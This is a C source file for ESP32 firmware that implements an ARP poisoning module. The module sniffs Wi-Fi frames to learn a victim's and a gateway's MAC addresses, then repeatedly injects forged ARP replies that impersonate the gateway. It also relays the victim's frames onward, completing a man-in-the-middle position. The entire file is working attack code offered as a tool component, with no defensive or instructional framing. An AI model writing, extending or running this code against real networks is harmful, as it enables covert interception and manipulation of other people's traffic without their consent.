#include <stdatomic.h>
#include "arp_poison.h"
#include "led_indicator.h"
#include "wifi_sniffer.h"
#include "esp_wifi.h"
#include "esp_mac.h"
#include "esp_timer.h"
#include "esp_heap_caps.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "freertos/semphr.h"
#include "wifi_tx_fix.h"

static const char *TAG = "arp_poison";

static arp_host_t g_arp_table[MAX_ARP_TABLE];
static int g_arp_table_count = 0;
static SemaphoreHandle_t g_arp_lock = NULL;
atomic_bool g_arp_poison_active = ATOMIC_VAR_INIT(false);
static atomic_bool g_arp_relay_enabled = ATOMIC_VAR_INIT(true);

static uint8_t g_esp_mac[6];
static uint8_t g_arp_victim_ip[4];
static uint8_t g_arp_gateway_ip[4];
static uint8_t g_arp_gateway_mac[6];
static uint8_t g_arp_victim_mac[6];
static uint8_t g_arp_victim_bssid[6];
static uint8_t g_arp_victim_channel = 0;
static bool   g_arp_have_gateway = false;
static bool   g_arp_have_victim = false;
static uint32_t g_arp_interval_ms = 2000;
static uint16_t g_arp_seq = 0;

static bool parse_ip_str(const char *s, uint8_t out[4])
{
    unsigned a, b, c, d;
    if (s == NULL) return false;
    if (sscanf(s, "%u.%u.%u.%u", &a, &b, &c, &d) != 4) return false;
    if (a > 255 || b > 255 || c > 255 || d > 255) return false;
    out[0] = (uint8_t)a; out[1] = (uint8_t)b;
    out[2] = (uint8_t)c; out[3] = (uint8_t)d;
    return true;
}

static void ip_print(const uint8_t ip[4])
{
    printf("%u.%u.%u.%u", ip[0], ip[1], ip[2], ip[3]);
}

static arp_host_t *arp_find_locked(const uint8_t ip[4])
{
    for (int i = 0; i < g_arp_table_count; i++) {
        if (memcmp(g_arp_table[i].ip, ip, 4) == 0) return &g_arp_table[i];
    }
    return NULL;
}

static void arp_upsert_locked(const uint8_t *mac, const uint8_t ip[4],
                              bool is_gateway)
{
    arp_host_t *e = arp_find_locked(ip);
    if (e != NULL) {
        memcpy(e->mac, mac, 6);
        e->pkt_count++;
        if (is_gateway) e->is_gateway = true;
        return;
    }
    if (g_arp_table_count >= MAX_ARP_TABLE) return;
    memcpy(g_arp_table[g_arp_table_count].mac, mac, 6);
    memcpy(g_arp_table[g_arp_table_count].ip, ip, 4);
    g_arp_table[g_arp_table_count].is_gateway = is_gateway;
    g_arp_table[g_arp_table_count].pkt_count = 1;
    g_arp_table_count++;
}

static void arp_build(uint8_t *f, const uint8_t *dst_mac, uint16_t op,
                      const uint8_t *sha, const uint8_t spa[4],
                      const uint8_t *tha, const uint8_t tpa[4],
                      const uint8_t *bssid)
{
    memset(f, 0, 60);
    f[0] = 0x08; f[1] = 0x00;                     // data, ToDS=0 FromDS=0
    memcpy(f + 4,  dst_mac, 6);
    memcpy(f + 10, sha, 6);
    memcpy(f + 16, bssid, 6);
    f[22] = (uint8_t)(g_arp_seq & 0xFF);
    f[23] = (uint8_t)((g_arp_seq >> 8) & 0x0F);
    g_arp_seq++;
    f[24] = 0xAA; f[25] = 0xAA; f[26] = 0x03;     // LLC/SNAP
    f[27] = 0x00; f[28] = 0x00; f[29] = 0x00;
    f[30] = 0x08; f[31] = 0x06;                   // ethertype ARP
    f[32] = 0x00; f[33] = 0x01;                   // htype: ethernet
    f[34] = 0x08; f[35] = 0x00;                   // ptype: IPv4
    f[36] = 0x06; f[37] = 0x04;                   // hlen/plen
    f[38] = (uint8_t)((op >> 8) & 0xFF); f[39] = (uint8_t)(op & 0xFF);
    memcpy(f + 40, sha, 6);  memcpy(f + 46, spa, 4);  // sender
    memcpy(f + 50, tha, 6);  memcpy(f + 56, tpa, 4);  // target
}

void arp_feed_packet(const uint8_t *data, size_t len)
{
    if (data == NULL || len < 60) return;
    if ((data[0] & 0x0C) != 0x08) return;                 // data frame

    uint8_t subtype = (data[0] >> 4) & 0x0F;
    size_t hdr = (subtype & 0x08) ? 26 : 24;              // QoS?

    static const uint8_t SNAP_ARP[8] = {0xAA,0xAA,0x03,0,0,0,0x08,0x06};
    if (len < hdr + 8 + 28) return;
    if (memcmp(data + hdr, SNAP_ARP, 8) != 0) return;

    const uint8_t *a = data + hdr + 8;
    uint16_t op = (a[6] << 8) | a[7];
    const uint8_t *sha = a + 8;                            // sender MAC
    const uint8_t *spa = a + 14;                           // sender IP

    xSemaphoreTake(g_arp_lock, portMAX_DELAY);

    if (op == 2 && memcmp(spa, g_arp_gateway_ip, 4) == 0) {
        memcpy(g_arp_gateway_mac, sha, 6);
        g_arp_have_gateway = true;
    }

    arp_upsert_locked(sha, spa, false);
    if (memcmp(spa, g_arp_victim_ip, 4) == 0) {
        memcpy(g_arp_victim_mac, sha, 6);
        g_arp_have_victim = true;

        wifi_sniffer_get_ap_bssid_and_channel_for_client(sha, g_arp_victim_bssid, &g_arp_victim_channel);
    }

    xSemaphoreGive(g_arp_lock);
}

void arp_relay_frame(const uint8_t *data, size_t len)
{
    if (!atomic_load(&g_arp_poison_active) || !atomic_load(&g_arp_relay_enabled)) return;
    if (data == NULL || len < 24) return;
    if (!g_arp_have_victim || !g_arp_have_gateway) return;

    uint8_t fixed_ch = atomic_load(&g_wifi_fixed_channel);
    uint8_t victim_ch = g_arp_victim_channel;
    if (victim_ch > 0 && victim_ch != fixed_ch) {
        atomic_store(&g_wifi_fixed_channel, victim_ch);
        esp_wifi_set_channel(victim_ch, WIFI_SECOND_CHAN_NONE);
    }

    if (memcmp(data + 10, g_arp_victim_mac, 6) != 0) return;
    if (memcmp(data + 4,  g_esp_mac, 6) != 0) return;

    uint8_t *out = heap_caps_malloc(len, MALLOC_CAP_SPIRAM | MALLOC_CAP_8BIT);
    if (out == NULL) return;

    memcpy(out, data, len);
    memcpy(out + 4, g_arp_gateway_mac, 6);

    wifi_tx_safe(WIFI_IF_AP, out, len);
    heap_caps_free(out);
}

static void arp_poison_task(void *arg)
{
    int64_t last = 0;

    while (atomic_load(&g_arp_poison_active)) {
        if (esp_timer_get_time() - last >= (int64_t)g_arp_interval_ms * 1000) {
            last = esp_timer_get_time();
            uint8_t f[60];
            uint8_t bcast[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
            uint8_t zero[6]  = {0,0,0,0,0,0};
            uint8_t bssid[6];

            xSemaphoreTake(g_arp_lock, portMAX_DELAY);
            memcpy(bssid, g_arp_victim_bssid, 6);
            xSemaphoreGive(g_arp_lock);

            arp_build(f, bcast, 1, g_esp_mac, (uint8_t[4]){0,0,0,0},
                      zero, g_arp_victim_ip, bssid);
            wifi_tx_safe(WIFI_IF_AP, f, sizeof(f));

            if (g_arp_have_victim) {
                arp_build(f, g_arp_victim_mac, 2, g_esp_mac, g_arp_gateway_ip,
                          g_arp_victim_mac, g_arp_victim_ip, bssid);
                wifi_tx_safe(WIFI_IF_AP, f, sizeof(f));

                arp_build(f, bcast, 2, g_esp_mac, g_arp_gateway_ip,
                          zero, g_arp_victim_ip, bssid);
                wifi_tx_safe(WIFI_IF_AP, f, sizeof(f));
            }
        }
        vTaskDelay(pdMS_TO_TICKS(100));
    }
    vTaskDelete(NULL);
}

esp_err_t arp_poison_init(void)
{
    if (g_arp_lock == NULL) {
        g_arp_lock = xSemaphoreCreateMutex();
        if (g_arp_lock == NULL) return ESP_ERR_NO_MEM;
    }
    esp_read_mac(g_esp_mac, ESP_MAC_WIFI_STA);
    ESP_LOGI(TAG, "ARP module ready (our MAC %02X:%02X:%02X:%02X:%02X:%02X)",
             g_esp_mac[0], g_esp_mac[1], g_esp_mac[2],
             g_esp_mac[3], g_esp_mac[4], g_esp_mac[5]);
    return ESP_OK;
}

esp_err_t arp_poison_start(const char *victim_ip, const char *gateway_ip,
                           uint32_t interval_ms)
{
    if (victim_ip == NULL || !parse_ip_str(victim_ip, g_arp_victim_ip))
        return ESP_ERR_INVALID_ARG;

    if (gateway_ip != NULL) {
        if (!parse_ip_str(gateway_ip, g_arp_gateway_ip))
            return ESP_ERR_INVALID_ARG;
        g_arp_have_gateway = true;
    }

    if (interval_ms >= 100) g_arp_interval_ms = interval_ms;

    if (!wifi_sniffer_is_active()) {
        esp_err_t r = wifi_sniffer_start(0);
        if (r != ESP_OK && r != ESP_ERR_INVALID_STATE) return r;
    }

    memset(g_arp_victim_mac, 0, 6);
    memset(g_arp_gateway_mac, 0, 6);
    g_arp_have_victim = false;

    atomic_store(&g_arp_poison_active, true);
    led_set_state(LED_STATE_SCANNING);

    if (xTaskCreatePinnedToCore(arp_poison_task, "arp_task", 3072, NULL, 5,
                                NULL, 0) != pdPASS) {
        atomic_store(&g_arp_poison_active, false);
        return ESP_FAIL;
    }

    ESP_LOGI(TAG, "ARP poison started, victim=");
    printf("ARP poison started. Waiting to learn victim MAC...\n");
    return ESP_OK;
}

esp_err_t arp_poison_stop(void)
{
    if (!atomic_load(&g_arp_poison_active)) return ESP_OK;
    atomic_store(&g_arp_poison_active, false);
    wifi_sniffer_clear_fixed_channel();
    led_set_state(LED_STATE_IDLE);
    ESP_LOGI(TAG, "ARP poison stopped");
    return ESP_OK;
}

bool arp_poison_is_active(void) { return atomic_load(&g_arp_poison_active); }

void arp_relay_set_enabled(bool on) { atomic_store(&g_arp_relay_enabled, on); }

void arp_poison_print_status(void)
{
    printf("\nARP poison: %s\n", g_arp_poison_active ? "ACTIVE" : "inactive");
    printf("Relay     : %s\n", g_arp_relay_enabled ? "on" : "off");
    printf("Victim    : ");
    ip_print(g_arp_victim_ip);
    printf(" -> MAC %s\n", g_arp_have_victim ? "learned" : "NOT YET (sending ARP requests...)");
    if (g_arp_have_victim)
        printf("  %02X:%02X:%02X:%02X:%02X:%02X (ch %u, ap %02X:%02X:%02X:%02X:%02X:%02X)\n",
               g_arp_victim_mac[0], g_arp_victim_mac[1], g_arp_victim_mac[2],
               g_arp_victim_mac[3], g_arp_victim_mac[4], g_arp_victim_mac[5],
               g_arp_victim_channel,
               g_arp_victim_bssid[0], g_arp_victim_bssid[1], g_arp_victim_bssid[2],
               g_arp_victim_bssid[3], g_arp_victim_bssid[4], g_arp_victim_bssid[5]);
    printf("Gateway   : ");
    ip_print(g_arp_gateway_ip);
    printf(" -> MAC %s\n", g_arp_have_gateway ? "learned" : "NOT YET (auto-learn)");
    if (g_arp_have_gateway)
        printf("  %02X:%02X:%02X:%02X:%02X:%02X\n",
               g_arp_gateway_mac[0], g_arp_gateway_mac[1], g_arp_gateway_mac[2],
               g_arp_gateway_mac[3], g_arp_gateway_mac[4], g_arp_gateway_mac[5]);
}

void arp_poison_print_table(void)
{
    xSemaphoreTake(g_arp_lock, portMAX_DELAY);
    printf("\nARP table (%d hosts)\n", g_arp_table_count);
    for (int i = 0; i < g_arp_table_count; i++) {
        printf("  %02X:%02X:%02X:%02X:%02X:%02X  ",
               g_arp_table[i].mac[0], g_arp_table[i].mac[1], g_arp_table[i].mac[2],
               g_arp_table[i].mac[3], g_arp_table[i].mac[4], g_arp_table[i].mac[5]);
        ip_print(g_arp_table[i].ip);
        printf("  %s  pkts=%" PRIu32 "\n",
               g_arp_table[i].is_gateway ? "[GW]" : "",
               g_arp_table[i].pkt_count);
    }
    xSemaphoreGive(g_arp_lock);
}
